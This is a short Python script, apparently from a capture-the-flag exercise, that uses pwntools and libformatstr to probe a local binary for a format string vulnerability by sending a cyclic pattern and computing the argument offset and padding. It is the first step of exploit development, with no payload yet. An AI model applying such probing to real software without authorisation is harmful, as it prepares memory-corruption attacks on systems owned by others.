#target program:print_test
from libformatstr import *
from pwn import *
from binascii import *
context.log_level = 'debug'
bufsiz = 100
elf=ELF('./elf')                    #test length
bufsiz = 100
r = process('./elf')
r.recvuntil("please tell me your name:")
r.sendline("aa")
r.recvuntil("leave your message please:")
r.sendline(make_pattern(bufsiz))             # send cyclic pattern to
data = r.recv()                                 # server's response
offset, padding = guess_argnum(data, bufsiz)    # find format string offset and padding
log.info("offset : " + str(offset))
log.info("padding: " + str(padding))
